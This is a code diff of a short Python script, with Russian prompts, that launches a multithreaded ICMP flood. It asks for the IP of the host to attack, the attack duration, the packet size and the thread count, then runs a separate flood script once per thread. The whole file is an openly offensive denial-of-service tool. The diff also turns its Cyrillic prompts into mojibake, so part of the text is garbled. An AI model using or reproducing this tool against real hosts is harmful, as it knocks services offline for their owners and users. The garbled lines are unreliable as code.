@@ -1,15 +1,14 @@
-# -*- coding: cp1251 -*-
-import subprocess
+п»їimport subprocess
 import threading
 
 def send_ping(ip_dest,duration,packet_size):
     subprocess.run(f'python icmp_flood_args.py -target {ip_dest} -duration {duration} -size {packet_size}', stdout=subprocess.DEVNULL)
 
 def main():
-    ip_destination = str(input('IP - адрес атакуемого хоста: '))
-    duration = int(input('Продолжительность атаки (с): '))
-    sent_buff_size = int(input('Размер пакета (байт): '))
-    num_threads = int(input('Количество потоков: '))
+    ip_destination = str(input('IP - Р°РґСЂРµСЃ Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°: '))
+    duration = int(input('РџСЂРѕРґРѕР»Р¶РёС‚РµР»СЊРЅРѕСЃС‚СЊ Р°С‚Р°РєРё (СЃ): '))
+    sent_buff_size = int(input('Р Р°Р·РјРµСЂ РїР°РєРµС‚Р° (Р±Р°Р№С‚): '))
+    num_threads = int(input('РљРѕР»РёС‡РµСЃС‚РІРѕ РїРѕС‚РѕРєРѕРІ: '))
 
     threads = []
     for i in range(num_threads):
